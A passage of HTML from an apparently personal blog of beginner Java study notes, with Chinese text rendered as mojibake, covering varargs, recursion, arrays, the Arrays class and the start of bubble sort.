(num1&lt;num2)&#123;</span><br><span class="line">            result=num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">max</span><span class="params">(<span class="type">double</span> num1,<span class="type">double</span> num2,<span class="type">double</span> num3)</span>&#123;</span><br><span class="line">        <span class="type">double</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(num1==num2)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;num1=num2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num1&gt;num2)&#123;</span><br><span class="line">            result=num1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (num1&lt;num2)&#123;</span><br><span class="line">            result=num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num3&gt;num2+num1)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;å“‡å“¦ï¼è¿™ä¸ªæ•°ä¹Ÿå¤ªå¤§äº†å§ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å‘½ä»¤è¡Œä¼ å‚"><a href="#å‘½ä»¤è¡Œä¼ å‚" class="headerlink" title="å‘½ä»¤è¡Œä¼ å‚"></a>å‘½ä»¤è¡Œä¼ å‚</h4><h4 id="å¯å˜å‚æ•°"><a href="#å¯å˜å‚æ•°" class="headerlink" title="å¯å˜å‚æ•°"></a>å¯å˜å‚æ•°</h4><p>JDK 1.5å¼€å§‹,Javaæ”¯æŒä¼ é€’åŒç±»å‹çš„å¯å˜å‚æ•°ç»™ä¸€ä¸ªæ–¹æ³•ã€‚åœ¨æ–¹æ³•å£°æ˜ä¸­ï¼Œåœ¨æŒ‡å®šå‚æ•°ç±»å‹ååŠ ä¸€ä¸ªçœç•¥å·(.â€¦.)ã€‚<br>ä¸€ä¸ªæ–¹æ³•ä¸­åªèƒ½æŒ‡å®šä¸€ä¸ªå¯å˜å‚æ•°ï¼Œå®ƒå¿…é¡»æ˜¯æ–¹æ³•çš„æœ€åä¸€ä¸ªå‚æ•°ã€‚ä»»ä½•æ™®é€šçš„å‚æ•°å¿…é¡»åœ¨å®ƒä¹‹å‰å£°æ˜ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Demo04 demo04=<span class="keyword">new</span> <span class="title class_">Demo04</span>();</span><br><span class="line">        demo04.test(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span>...i)</span>&#123;</span><br><span class="line">        System.out.println(i[<span class="number">0</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">1</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">2</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">3</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">4</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="é€’å½’"><a href="#é€’å½’" class="headerlink" title="é€’å½’"></a>é€’å½’</h4><blockquote><p>Aæ–¹æ³•è°ƒç”¨Bæ–¹æ³•ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“ç†è§£!<br>é€’å½’å°±æ˜¯:Aæ–¹æ³•è°ƒç”¨Aæ–¹æ³•!å°±æ˜¯è‡ªå·±è°ƒç”¨è‡ªå·±<br>åˆ©ç”¨é€’å½’å¯ä»¥ç”¨ç®€å•çš„ç¨‹åºæ¥è§£å†³ä¸€äº›å¤æ‚çš„é—®é¢˜ã€‚å®ƒé€šå¸¸æŠŠä¸€ä¸ªå¤§å‹å¤æ‚çš„é—®é¢˜å±‚å±‚è½¬åŒ–ä¸ºä¸€ä¸ªä¸åŸé—®é¢˜ç›¸ä¼¼çš„è§„æ¨¡è¾ƒå°çš„é—®é¢˜æ¥æ±‚è§£ï¼Œé€’å½’ç­–ç•¥åªéœ€å°‘é‡çš„ç¨‹åºå°±å¯æè¿°å‡ºè§£é¢˜è¿‡ç¨‹æ‰€éœ€è¦çš„å¤šæ¬¡é‡å¤è®¡ç®—ï¼Œå¤§å¤§åœ°å‡å°‘äº†ç¨‹åºçš„ä»£ç é‡ã€‚é€’å½’çš„èƒ½åŠ›åœ¨äºç”¨æœ‰é™çš„è¯­å¥æ¥å®šä¹‰å¯¹è±¡çš„æ— é™é›†åˆã€‚<br>é€’å½’ç»“æ„åŒ…æ‹¬ä¸¤ä¸ªéƒ¨åˆ†:<br>é€’å½’å¤´:ä»€ä¹ˆæ—¶å€™ä¸è°ƒç”¨è‡ªèº«æ–¹æ³•ã€‚å¦‚æœæ²¡æœ‰å¤´ï¼Œå°†é™·å…¥æ­»å¾ªç¯ã€‚é€’å½’ä½“:ä»€ä¹ˆæ—¶å€™éœ€è¦è°ƒç”¨è‡ªèº«æ–¹æ³•ã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo06</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(f(<span class="number">5</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> n*f(n-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230824115453376.png" alt="image-20230824115453376"></p><p>è¾¹ç•Œæ¡ä»¶ï¼šè¾¹ç•Œ</p><p>å‰é˜¶æ®µï¼š</p><p>è¿”å›é˜¶æ®µï¼šn*ï¼ˆn-1ï¼‰</p><p><strong>å°½é‡å°‘ç”¨é€’å½’ï¼Œå‹æ ˆçš„æ—¶å€™ç”µè„‘å®¹æ˜“å´©æºƒ</strong></p><h3 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h3><p>æ•°ç»„æ˜¯ç›¸åŒç±»å‹æ•°æ®çš„æœ‰åºé›†åˆ.<br>æ•°ç»„æè¿°çš„æ˜¯ç›¸åŒç±»å‹çš„è‹¥å¹²ä¸ªæ•°æ®,æŒ‰ç…§ä¸€å®šçš„å…ˆåæ¬¡åºæ’åˆ—ç»„åˆè€Œæˆã€‚<br>å…¶ä¸­,æ¯ä¸€ä¸ªæ•°æ®ç§°ä½œä¸€ä¸ªæ•°ç»„å…ƒç´ ,æ¯ä¸ªæ•°ç»„å…ƒç´ å¯ä»¥é€šè¿‡ä¸€ä¸ªä¸‹æ ‡æ¥è®¿é—®å®ƒä»¬.</p><h4 id="æ•°ç»„çš„å£°æ˜å’Œåˆ›å»º"><a href="#æ•°ç»„çš„å£°æ˜å’Œåˆ›å»º" class="headerlink" title="æ•°ç»„çš„å£°æ˜å’Œåˆ›å»º"></a>æ•°ç»„çš„å£°æ˜å’Œåˆ›å»º</h4><p>é¦–å…ˆå¿…é¡»å£°æ˜æ•°ç»„å˜é‡ï¼Œæ‰èƒ½åœ¨ç¨‹åºä¸­ä½¿ç”¨æ•°ç»„ã€‚ä¸‹é¢æ˜¯å£°æ˜æ•°ç»„å˜é‡çš„è¯­æ³•:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dataType[]arrayRefVar;//é¦–é€‰çš„æ–¹æ³•</span><br><span class="line">æˆ–</span><br><span class="line">å›</span><br><span class="line">dataType arrayRefVar[];1/æ•ˆæœæ¢…åŒï¼Œä½†ä¸æ˜¯é¦–é€‰æ–¹æ³•</span><br></pre></td></tr></table></figure><p>Javaè¯­è¨€ä½¿ç”¨newæ“ä½œç¬¦æ¥åˆ›å»ºæ•°ç»„ï¼Œè¯­æ³•å¦‚ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dataType[] arrayRefVar = new dataType[ arraySize];</span><br></pre></td></tr></table></figure><p>æ•°ç»„çš„å…ƒç´ æ˜¯é€šè¿‡ç´¢å¼•è®¿é—®çš„ï¼Œæ•°ç»„ç´¢å¼•ä»Ğå¼€å§‹ã€‚<br>è·å–æ•°ç»„é•¿åº¦:<br>arrays. length</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="comment">//å˜é‡å¾—ç±»å‹  å˜é‡çš„åå­—=å˜é‡çš„å€¼</span></span><br><span class="line">    <span class="comment">//æ•°ç»„ç±»å‹</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> [] nums;<span class="comment">//1.å£°æ˜ä¸€ä¸ªæ•°ç»„</span></span><br><span class="line">        nums=<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];<span class="comment">//2.åˆ›å»ºä¸€ä¸ªæ•°ç»„è¿™é‡Œé¢å¯ä»¥å­˜æ”¾10ä¸ªintç±»å‹çš„æ•°æ®</span></span><br><span class="line">        <span class="comment">//3.ç»™æ•°ç»„ä¸­çš„å…ƒç´ èµ‹å€¼</span></span><br><span class="line">        nums[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        nums[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">        nums[<span class="number">2</span>]=<span class="number">751</span>;</span><br><span class="line">        nums[<span class="number">3</span>]=<span class="number">16</span>;</span><br><span class="line">        nums[<span class="number">4</span>]=<span class="number">51</span>;</span><br><span class="line">        nums[<span class="number">5</span>]=<span class="number">15</span>;</span><br><span class="line">        nums[<span class="number">6</span>]=<span class="number">14</span>;</span><br><span class="line">        nums[<span class="number">7</span>]=<span class="number">21</span>;</span><br><span class="line">        nums[<span class="number">8</span>]=<span class="number">123</span>;</span><br><span class="line">        nums[<span class="number">9</span>]=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//è®¡ç®—æ‰€æœ‰å…ƒç´ çš„å’Œ</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;nums.length; i++) &#123;</span><br><span class="line">            sum=sum+nums[i];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sum);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•°ç»„çš„å››ä¸ªåŸºæœ¬ç‰¹ç‚¹<br>å…¶é•¿åº¦æ˜¯ç¡®å®šçš„ã€‚æ•°ç»„ä¸€æ—¦è¢«åˆ›å»ºï¼Œå®ƒçš„å¤§å°å°±æ˜¯ä¸å¯ä»¥æ”¹å˜çš„ã€‚å…¶å…ƒç´ å¿…é¡»æ˜¯ç›¸åŒç±»å‹,ä¸å…è®¸å‡ºç°æ··åˆç±»å‹ã€‚<br>æ•°ç»„ä¸­çš„å…ƒç´ å¯ä»¥æ˜¯ä»»ä½•æ•°æ®ç±»å‹ï¼ŒåŒ…æ‹¬åŸºæœ¬ç±»å‹å’Œå¼•ç”¨ç±»å‹ã€‚<br>æ•°ç»„å˜é‡å±å¼•ç”¨ç±»å‹ï¼Œæ•°ç»„ä¹Ÿå¯ä»¥çœ‹æˆæ˜¯å¯¹è±¡ï¼Œæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ç›¸å½“äºè¯¥å¯¹è±¡çš„æˆå‘˜å˜é‡ã€‚æ•°ç»„æœ¬èº«å°±æ˜¯å¯¹è±¡ï¼ŒJavaä¸­å¯¹è±¡æ˜¯åœ¨å †ä¸­çš„ï¼Œå› æ­¤æ•°ç»„æ— è®ºä¿å­˜åŸå§‹ç±»å‹è¿˜æ˜¯å…¶ä»–å¯¹è±¡ç±»å‹,æ•°ç»„å¯¹è±¡æœ¬èº«æ˜¯åœ¨å †ä¸­çš„ã€‚</p><h4 id="javaå†…å­˜åˆ†æ"><a href="#javaå†…å­˜åˆ†æ" class="headerlink" title="javaå†…å­˜åˆ†æ"></a>javaå†…å­˜åˆ†æ</h4><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230824163338365.png" alt="image-20230824163338365"></p><blockquote><p>ä¸‰ç§åˆå§‹åŒ–</p><p>é™æ€åˆå§‹åŒ–<br>int[] a &#x3D; {1,2,3];<br>Man[ ] mans &#x3D; {new Man(1,1) ,new Man(2,2)};<br>åŠ¨æ€åˆå§‹åŒ–<br>int[] a &#x3D; new int[2];a[0]&#x3D;1;<br>a[1]&#x3D;2;<br>æ•°ç»„çš„é»˜è®¤åˆå§‹åŒ–<br>æ•°ç»„æ˜¯å¼•ç”¨ç±»å‹ï¼Œå®ƒçš„å…ƒç´ ç›¸å½“äºç±»çš„å®ä¾‹å˜é‡ï¼Œå› æ­¤æ•°ç»„ä¸€ç»åˆ†é…ç©ºé—´ï¼Œå…¶ä¸­çš„æ¯ä¸ªå…ƒç´ ä¹Ÿè¢«æŒ‰ç…§å®ä¾‹å˜é‡åŒæ ·çš„æ–¹å¼è¢«éšå¼åˆå§‹åŒ–ã€‚</p></blockquote><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230824172553805.png" alt="image-20230824172553805"></p><p>æ•°ç»„æ˜¯ç›¸åŒæ•°æ®ç±»å‹(æ•°æ®ç±»å‹å¯ä»¥ä¸ºä»»æ„ç±»å‹)çš„æœ‰åºé›†åˆæ•°ç»„ä¹Ÿæ˜¯å¯¹è±¡ã€‚æ•°ç»„å…ƒç´ ç›¸å½“äºå¯¹è±¡çš„æˆå‘˜å˜é‡<br>æ•°ç»„é•¿åº¦çš„ç¡®å®šçš„ï¼Œä¸å¯å˜çš„ã€‚å¦‚æœè¶Šç•Œï¼Œåˆ™æŠ¥:ArraylndexOutofBounds</p><h4 id="æ•°ç»„çš„ä½¿ç”¨"><a href="#æ•°ç»„çš„ä½¿ç”¨" class="headerlink" title="æ•°ç»„çš„ä½¿ç”¨"></a>æ•°ç»„çš„ä½¿ç”¨</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArraryDemo03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> []arrays=&#123;<span class="number">14</span>,<span class="number">22</span>,<span class="number">3342</span>,<span class="number">4</span>,<span class="number">545</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ‰“å°å‡ºæ¥å…¨éƒ¨çš„æ•°ç»„æ•°æ®</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;arrays.length;i++)&#123;</span><br><span class="line">            System.out.println(arrays[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;------------&quot;</span>);</span><br><span class="line">        <span class="comment">//è®¡ç®—æ‰€æœ‰å…ƒç´ çš„å’Œ</span></span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;arrays.length;i++)&#123;</span><br><span class="line">            sum=sum+arrays[i];</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;sum=&quot;</span>+sum);</span><br><span class="line">        <span class="comment">//æŸ¥æ‰¾æœ€å¤§å…ƒç´ </span></span><br><span class="line">        System.out.println(<span class="string">&quot;    æŸ¥æ‰¾æœ€å¤§å…ƒç´    &quot;</span>);</span><br><span class="line">        <span class="type">int</span> max=arrays[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;arrays.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arrays[i]&gt;max)&#123;</span><br><span class="line">                max=arrays[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;max=&quot;</span>+max);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayDemo04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arrays = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>&#125;;</span><br><span class="line">        <span class="comment">//JDK1,5  æ²¡æœ‰ä¸‹æ ‡</span></span><br><span class="line"><span class="comment">//        for (int array : arrays) &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(array);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        printArrary(arrays);</span><br><span class="line">        <span class="type">int</span>[] reverse=reverse(arrays);</span><br><span class="line">        printArrary(reverse);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ‰“å°æ•°ç»„å…ƒç´ </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printArrary</span><span class="params">(<span class="type">int</span>[] arrays)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arrays.length; i++) &#123;</span><br><span class="line">            System.out.print(arrays[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åè½¬æ•°ç»„</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] reverse(<span class="type">int</span>[] arrays) &#123;</span><br><span class="line">        <span class="type">int</span>[] result=<span class="keyword">new</span> <span class="title class_">int</span>[arrays.length];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åè½¬çš„æ“ä½œ</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>,j=result.length-<span class="number">1</span>;i&lt;arrays.length;i++,j--)&#123;</span><br><span class="line">            result[j]=arrays[i];</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å¤šç»´æ•°ç»„"><a href="#å¤šç»´æ•°ç»„" class="headerlink" title="å¤šç»´æ•°ç»„"></a>å¤šç»´æ•°ç»„</h4><p>å¤šç»´æ•°ç»„å¯ä»¥çœ‹æˆæ˜¯æ•°ç»„çš„æ•°ç»„ï¼Œæ¯”å¦‚ä¸€ä¸ªäºŒç»´æ•°ç»„</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230825155338196.png" alt="image-20230825155338196"></p><p>####Arraysç±»<br>æ•°ç»„çš„å·¥å…·ç±»java.util.Arrays<br>ç”±äºæ•°ç»„å¯¹è±¡æœ¬èº«å¹¶æ²¡æœ‰ä»€ä¹ˆæ–¹æ³•å¯ä»¥ä¾›æˆ‘ä»¬è°ƒç”¨,ä½†APIä¸­æä¾›äº†ä¸€ä¸ªå·¥å…·ç±»Arraysä¾›æˆ‘ä»¬ä½¿ç”¨,ä»è€Œå¯ä»¥å¯¹æ•°æ®å¯¹è±¡è¿›è¡Œä¸€äº›åŸºæœ¬çš„æ“ä½œã€‚<br>æŸ¥çœ‹JDKå¸®åŠ©æ–‡æ¡£<br>Arraysç±»ä¸­çš„æ–¹æ³•éƒ½æ˜¯staticä¿®é¥°çš„é™æ€æ–¹æ³•,åœ¨ä½¿ç”¨çš„æ—¶å€™å¯ä»¥ç›´æ¥ä½¿ç”¨ç±»åè¿›è¡Œè°ƒç”¨,è€Œâ€ä¸ç”¨â€ä½¿ç”¨å¯¹è±¡æ¥è°ƒç”¨(æ³¨æ„:æ˜¯â€ä¸ç”¨â€è€Œä¸æ˜¯â€ä¸èƒ½â€)<br>å…·æœ‰ä»¥ä¸‹å¸¸ç”¨åŠŸèƒ½:<br>ç»™æ•°ç»„èµ‹å€¼:é€šè¿‡filæ–¹æ³•ã€‚<br>å¯¹æ•°ç»„æ’åº:é€šè¿‡sortæ–¹æ³•,æŒ‰å‡åºã€‚<br>æ¯”è¾ƒæ•°ç»„:é€šè¿‡equalsæ–¹æ³•æ¯”è¾ƒæ•°ç»„ä¸­å…ƒç´ å€¼æ˜¯å¦ç›¸ç­‰ã€‚<br>â—†æŸ¥æ‰¾æ•°ç»„å…ƒç´ :é€šè¿‡binarySearchæ–¹æ³•èƒ½å¯¹æ’åºå¥½çš„æ•°ç»„è¿›è¡ŒäºŒåˆ†æŸ¥æ‰¾æ³•æ“ä½œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayDemo06</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> [] a=&#123;<span class="number">7</span>,<span class="number">3</span>,<span class="number">34</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">612</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        System.out.println(a);<span class="comment">//[I@1b6d3586</span></span><br><span class="line">        <span class="comment">//æ‰“å°æ•°ç»„å…ƒç´ </span></span><br><span class="line">        Arrays.sort(a);<span class="comment">//æ’åº</span></span><br><span class="line">        System.out.println(Arrays.toString(a));</span><br><span class="line">        printArray(a);</span><br><span class="line">        Arrays.fill(a,<span class="number">2</span>,<span class="number">5</span>,<span class="number">0</span>);</span><br><span class="line">        System.out.println(Arrays.toString(a));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printArray</span><span class="params">(<span class="type">int</span>[] a)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;a.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;[&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i==a.length-<span class="number">1</span>)&#123;</span><br><span class="line">                System.out.print(a[i]+<span class="string">&quot;]&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.print(a[i]+<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å†’æ³¡æ’åº"><a href="#å†’æ³¡æ’åº" class="headerlink" title="å†’æ³¡æ’åº"></a>å†’æ³¡æ’åº</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 